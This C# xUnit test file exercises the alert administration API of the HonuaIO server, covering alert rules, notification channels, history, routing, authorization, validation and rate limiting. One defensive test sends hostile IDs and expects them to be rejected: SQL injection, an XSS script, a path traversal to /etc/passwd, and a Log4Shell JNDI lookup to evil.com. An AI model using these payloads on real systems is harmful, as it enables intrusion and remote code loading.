// Copyright (c) 2025 HonuaIO
// Licensed under the Elastic License 2.0. See LICENSE file in the project root for full license information.

using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using FluentAssertions;
using Microsoft.AspNetCore.Mvc.Testing;
using Xunit;

namespace Honua.Server.Host.Tests.Admin;

/// <summary>
/// Comprehensive tests for Alert Administration API endpoints.
/// Tests CRUD operations, authorization, validation, and rate limiting.
/// </summary>
[Collection("HostTests")]
[Trait("Category", "Unit")]
public sealed class AlertAdministrationEndpointsTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly WebApplicationFactory<Program> _factory;
    private readonly HttpClient _client;

    public AlertAdministrationEndpointsTests(WebApplicationFactory<Program> factory)
    {
        _factory = factory;
        _client = factory.CreateClient();
    }

    #region Alert Rule CRUD Tests

    [Fact]
    public async Task CreateAlertRule_WithValidData_ReturnsCreated()
    {
        // Arrange
        var newRule = new
        {
            Name = "High CPU Usage",
            Description = "Alert when CPU usage exceeds 80%",
            Severity = "warning",
            Condition = new
            {
                Metric = "cpu_usage",
                Operator = "greater_than",
                Threshold = 80,
                Duration = "5m"
            },
            Enabled = true,
            NotificationChannels = new[] { "default-email" }
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/rules", newRule);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);

        if (response.StatusCode == HttpStatusCode.Created)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotBeEmpty();

            var result = JsonSerializer.Deserialize<JsonElement>(content);
            result.TryGetProperty("id", out var id).Should().BeTrue();
            id.ToString().Should().NotBeNullOrEmpty();
        }
    }

    [Fact]
    public async Task CreateAlertRule_WithInvalidData_ReturnsBadRequest()
    {
        // Arrange - Missing required fields
        var invalidRule = new
        {
            Name = "",  // Empty name
            Severity = "invalid_severity"  // Invalid severity
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/rules", invalidRule);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetAlertRule_WithValidId_ReturnsRule()
    {
        // Arrange
        var ruleId = "test-rule-id";

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/rules/{ruleId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task GetAllAlertRules_ReturnsRuleList()
    {
        // Act
        var response = await _client.GetAsync("/api/admin/alerts/rules");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);

        if (response.StatusCode == HttpStatusCode.OK)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotBeNull();
        }
    }

    [Fact]
    public async Task UpdateAlertRule_WithValidData_ReturnsOk()
    {
        // Arrange
        var ruleId = "test-rule-id";
        var updatedRule = new
        {
            Name = "Updated High CPU Usage",
            Description = "Alert when CPU usage exceeds 90%",
            Severity = "critical",
            Condition = new
            {
                Metric = "cpu_usage",
                Operator = "greater_than",
                Threshold = 90,
                Duration = "3m"
            },
            Enabled = true,
            NotificationChannels = new[] { "default-email", "slack-ops" }
        };

        // Act
        var response = await _client.PutAsJsonAsync($"/api/admin/alerts/rules/{ruleId}", updatedRule);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task DeleteAlertRule_WithValidId_ReturnsNoContent()
    {
        // Arrange
        var ruleId = "test-rule-id";

        // Act
        var response = await _client.DeleteAsync($"/api/admin/alerts/rules/{ruleId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.NoContent,
            HttpStatusCode.OK,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Theory]
    [InlineData("' OR '1'='1")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("../../etc/passwd")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    public async Task GetAlertRule_WithMaliciousId_IsRejected(string maliciousId)
    {
        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/rules/{maliciousId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    #endregion

    #region Notification Channel CRUD Tests

    [Fact]
    public async Task CreateNotificationChannel_Email_ReturnsCreated()
    {
        // Arrange
        var newChannel = new
        {
            Name = "Operations Email",
            Type = "email",
            Config = new
            {
                Recipients = new[] { "ops@example.com", "alerts@example.com" },
                Subject = "Alert: {alertName}",
                Template = "default"
            },
            Enabled = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/channels", newChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task CreateNotificationChannel_Slack_ReturnsCreated()
    {
        // Arrange
        var newChannel = new
        {
            Name = "Slack Operations",
            Type = "slack",
            Config = new
            {
                WebhookUrl = "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX",
                Channel = "#alerts",
                Username = "Honua Alerts",
                IconEmoji = ":warning:"
            },
            Enabled = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/channels", newChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task CreateNotificationChannel_PagerDuty_ReturnsCreated()
    {
        // Arrange
        var newChannel = new
        {
            Name = "PagerDuty Incidents",
            Type = "pagerduty",
            Config = new
            {
                IntegrationKey = "test-integration-key",
                Severity = "critical"
            },
            Enabled = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/channels", newChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task CreateNotificationChannel_SNS_ReturnsCreated()
    {
        // Arrange
        var newChannel = new
        {
            Name = "AWS SNS Topic",
            Type = "sns",
            Config = new
            {
                TopicArn = "arn:aws:sns:us-east-1:123456789012:honua-alerts",
                Region = "us-east-1"
            },
            Enabled = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/channels", newChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetNotificationChannel_WithValidId_ReturnsChannel()
    {
        // Arrange
        var channelId = "test-channel-id";

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/channels/{channelId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task GetAllNotificationChannels_ReturnsChannelList()
    {
        // Act
        var response = await _client.GetAsync("/api/admin/alerts/channels");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task UpdateNotificationChannel_WithValidData_ReturnsOk()
    {
        // Arrange
        var channelId = "test-channel-id";
        var updatedChannel = new
        {
            Name = "Updated Operations Email",
            Type = "email",
            Config = new
            {
                Recipients = new[] { "ops@example.com", "alerts@example.com", "oncall@example.com" }
            },
            Enabled = true
        };

        // Act
        var response = await _client.PutAsJsonAsync($"/api/admin/alerts/channels/{channelId}", updatedChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task DeleteNotificationChannel_WithValidId_ReturnsNoContent()
    {
        // Arrange
        var channelId = "test-channel-id";

        // Act
        var response = await _client.DeleteAsync($"/api/admin/alerts/channels/{channelId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.NoContent,
            HttpStatusCode.OK,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task TestNotificationChannel_SendsTestAlert()
    {
        // Arrange
        var channelId = "test-channel-id";

        // Act
        var response = await _client.PostAsync($"/api/admin/alerts/channels/{channelId}/test", null);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.BadRequest);
    }

    #endregion

    #region Alert History Tests

    [Fact]
    public async Task GetAlertHistory_ReturnsHistoryList()
    {
        // Act
        var response = await _client.GetAsync("/api/admin/alerts/history");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetAlertHistory_WithPagination_ReturnsPagedResults()
    {
        // Arrange
        var pageSize = 20;
        var pageNumber = 1;

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/history?pageSize={pageSize}&pageNumber={pageNumber}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetAlertHistory_WithSeverityFilter_ReturnsFilteredResults()
    {
        // Arrange
        var severity = "critical";

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/history?severity={severity}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetAlertHistory_WithDateRange_ReturnsFilteredResults()
    {
        // Arrange
        var startDate = DateTime.UtcNow.AddDays(-7).ToString("o");
        var endDate = DateTime.UtcNow.ToString("o");

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/history?startDate={startDate}&endDate={endDate}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetAlertHistory_WithRuleIdFilter_ReturnsFilteredResults()
    {
        // Arrange
        var ruleId = "test-rule-id";

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/history?ruleId={ruleId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetAlertHistoryById_WithValidId_ReturnsAlert()
    {
        // Arrange
        var alertId = "test-alert-id";

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/history/{alertId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task AcknowledgeAlert_WithValidId_ReturnsOk()
    {
        // Arrange
        var alertId = "test-alert-id";
        var acknowledgement = new
        {
            AcknowledgedBy = "admin@example.com",
            Note = "Investigating the issue"
        };

        // Act
        var response = await _client.PostAsJsonAsync($"/api/admin/alerts/history/{alertId}/acknowledge", acknowledgement);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task ResolveAlert_WithValidId_ReturnsOk()
    {
        // Arrange
        var alertId = "test-alert-id";
        var resolution = new
        {
            ResolvedBy = "admin@example.com",
            Resolution = "Increased server capacity"
        };

        // Act
        var response = await _client.PostAsJsonAsync($"/api/admin/alerts/history/{alertId}/resolve", resolution);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    #endregion

    #region Routing Configuration Tests

    [Fact]
    public async Task CreateRoutingRule_WithValidData_ReturnsCreated()
    {
        // Arrange
        var newRoute = new
        {
            Name = "Critical Alerts to PagerDuty",
            Priority = 1,
            Conditions = new[]
            {
                new { Field = "severity", Operator = "equals", Value = "critical" }
            },
            Channels = new[] { "pagerduty-oncall" }
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/routing", newRoute);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task GetRoutingRules_ReturnsRuleList()
    {
        // Act
        var response = await _client.GetAsync("/api/admin/alerts/routing");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task UpdateRoutingRule_WithValidData_ReturnsOk()
    {
        // Arrange
        var routeId = "test-route-id";
        var updatedRoute = new
        {
            Name = "Critical and Warning Alerts to PagerDuty",
            Priority = 1,
            Conditions = new[]
            {
                new { Field = "severity", Operator = "in", Value = new[] { "critical", "warning" } }
            },
            Channels = new[] { "pagerduty-oncall", "slack-ops" }
        };

        // Act
        var response = await _client.PutAsJsonAsync($"/api/admin/alerts/routing/{routeId}", updatedRoute);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.NoContent,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task DeleteRoutingRule_WithValidId_ReturnsNoContent()
    {
        // Arrange
        var routeId = "test-route-id";

        // Act
        var response = await _client.DeleteAsync($"/api/admin/alerts/routing/{routeId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.NoContent,
            HttpStatusCode.OK,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    #endregion

    #region Authorization Tests

    [Fact]
    public async Task CreateAlertRule_WithoutAdminRole_ReturnsForbidden()
    {
        // Arrange
        var client = _factory.CreateClient();
        // Not adding admin authorization
        var newRule = new
        {
            Name = "Test Rule",
            Severity = "info"
        };

        // Act
        var response = await client.PostAsJsonAsync("/api/admin/alerts/rules", newRule);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task DeleteAlertRule_WithoutAdminRole_ReturnsForbidden()
    {
        // Arrange
        var client = _factory.CreateClient();
        var ruleId = "test-rule-id";

        // Act
        var response = await client.DeleteAsync($"/api/admin/alerts/rules/{ruleId}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task CreateNotificationChannel_WithoutAdminRole_ReturnsForbidden()
    {
        // Arrange
        var client = _factory.CreateClient();
        var newChannel = new
        {
            Name = "Test Channel",
            Type = "email"
        };

        // Act
        var response = await client.PostAsJsonAsync("/api/admin/alerts/channels", newChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Validation Tests

    [Theory]
    [InlineData("")]
    [InlineData(" ")]
    [InlineData(null)]
    public async Task CreateAlertRule_WithInvalidName_ReturnsBadRequest(string? invalidName)
    {
        // Arrange
        var invalidRule = new
        {
            Name = invalidName,
            Severity = "warning"
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/rules", invalidRule);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("invalid")]
    [InlineData("CRITICAL")]
    [InlineData("high")]
    public async Task CreateAlertRule_WithInvalidSeverity_ReturnsBadRequest(string invalidSeverity)
    {
        // Arrange
        var invalidRule = new
        {
            Name = "Test Rule",
            Severity = invalidSeverity
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/rules", invalidRule);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task CreateNotificationChannel_WithInvalidEmail_ReturnsBadRequest()
    {
        // Arrange
        var invalidChannel = new
        {
            Name = "Test Email",
            Type = "email",
            Config = new
            {
                Recipients = new[] { "not-an-email", "also-invalid" }
            }
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/channels", invalidChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task CreateNotificationChannel_WithInvalidSlackWebhook_ReturnsBadRequest()
    {
        // Arrange
        var invalidChannel = new
        {
            Name = "Test Slack",
            Type = "slack",
            Config = new
            {
                WebhookUrl = "not-a-valid-url"
            }
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/admin/alerts/channels", invalidChannel);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Rate Limiting Tests

    [Fact]
    public async Task CreateAlertRule_ExceedingRateLimit_ReturnsTooManyRequests()
    {
        // Arrange
        var newRule = new
        {
            Name = "Test Rule",
            Severity = "info"
        };

        // Act - Make many requests in quick succession
        var tasks = Enumerable.Range(0, 100)
            .Select(_ => _client.PostAsJsonAsync("/api/admin/alerts/rules", newRule));

        var responses = await Task.WhenAll(tasks);

        // Assert - At least some should be rate limited (if rate limiting is enabled)
        var rateLimitedResponses = responses.Count(r => r.StatusCode == HttpStatusCode.TooManyRequests);

        // Note: Rate limiting may not be configured in test environment
        responses.Should().NotBeEmpty();
    }

    [Fact]
    public async Task TestNotificationChannel_ExceedingRateLimit_ReturnsTooManyRequests()
    {
        // Arrange
        var channelId = "test-channel-id";

        // Act - Make many test requests in quick succession
        var tasks = Enumerable.Range(0, 50)
            .Select(_ => _client.PostAsync($"/api/admin/alerts/channels/{channelId}/test", null));

        var responses = await Task.WhenAll(tasks);

        // Assert - Should have some rate limiting for test endpoints
        var rateLimitedResponses = responses.Count(r => r.StatusCode == HttpStatusCode.TooManyRequests);

        responses.Should().NotBeEmpty();
    }

    #endregion

    #region Statistics Tests

    [Fact]
    public async Task GetAlertStatistics_ReturnsStatistics()
    {
        // Act
        var response = await _client.GetAsync("/api/admin/alerts/statistics");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);

        if (response.StatusCode == HttpStatusCode.OK)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotBeNullOrEmpty();
        }
    }

    [Fact]
    public async Task GetAlertStatistics_ByTimeRange_ReturnsStatistics()
    {
        // Arrange
        var startDate = DateTime.UtcNow.AddDays(-30).ToString("o");
        var endDate = DateTime.UtcNow.ToString("o");

        // Act
        var response = await _client.GetAsync($"/api/admin/alerts/statistics?startDate={startDate}&endDate={endDate}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion
}
